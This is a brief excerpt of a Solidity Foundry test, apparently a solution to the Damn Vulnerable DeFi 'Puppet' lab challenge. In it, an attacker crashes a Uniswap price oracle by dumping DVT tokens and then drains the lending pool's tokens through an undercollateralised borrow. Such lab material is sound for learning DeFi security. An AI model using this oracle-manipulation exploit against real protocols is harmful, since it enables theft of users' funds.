...
contract Puppet is Test {
    ...
    function testExploit() public {
        ...
        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), 9 ether, block.timestamp + 2 days);
        puppetPool.borrow{value: attacker.balance}(dvt.balanceOf(address(puppetPool)));
        console.log("DVT balance of attacker", dvt.balanceOf(attacker));
        console.log("DVT balance of puppetPool", dvt.balanceOf(address(puppetPool)));
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
